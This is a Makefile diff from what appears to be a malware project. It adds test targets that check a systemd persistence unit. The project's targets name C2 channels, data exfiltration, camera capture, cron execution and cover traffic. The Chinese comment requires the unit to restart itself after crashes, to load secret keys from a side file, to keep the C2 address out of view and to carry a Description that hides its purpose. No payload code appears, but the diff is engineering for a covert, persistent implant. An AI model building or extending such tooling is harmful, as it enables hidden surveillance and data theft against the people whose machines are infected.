@@ -270,7 +270,24 @@ verify-onekey-front:
 verify-prefix:
 	@python3 tests/verify_prefix_isolation.py
 
-test: verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-cron-exec verify-prefix $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol
+# systemd 单元静态契约。systemd 主路径在本沙盒无法运行时验证（PID 1 非
+# systemd，/run/systemd/private 无监听者），因此"单元内容应当满足什么"
+# 必须以静态契约的形式永久校验——否则它是整条链上唯一一块从没被检查过
+# 的地方，而它恰恰是生产环境的主路径。断言：Restart=always（崩溃自拉起）、
+# EnvironmentFile 指向 conf（密钥注入通路）、ExecStart 走 run.sh 包装器
+# （ExecStart 内的 $C2_ADDR 不会被 EnvironmentFile 替换，真 systemd 实测
+# 踩出来的缺陷）、不含密钥与 C2 地址、Description 不点明功能，以及 run.sh
+# 的 conf/bin 路径与 CONF_FILE/BIN_DST 同源。三条反向注入分别证明这三类
+# 断言不是恒绿。
+verify-unit-contract:
+	@python3 tests/verify_unit_contract.py forward
+
+verify-unit-contract-reverse:
+	@python3 tests/verify_unit_contract.py desc
+	@python3 tests/verify_unit_contract.py restart
+	@python3 tests/verify_unit_contract.py paths
+
+test: verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-cron-exec verify-prefix verify-unit-contract verify-unit-contract-reverse $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
@@ -294,4 +311,4 @@ inspect: all
 clean:
 	rm -rf $(BUILD)
 
-.PHONY: all test clean inspect verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-cron-exec verify-prefix
+.PHONY: all test clean inspect verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-cron-exec verify-prefix verify-unit-contract verify-unit-contract-reverse
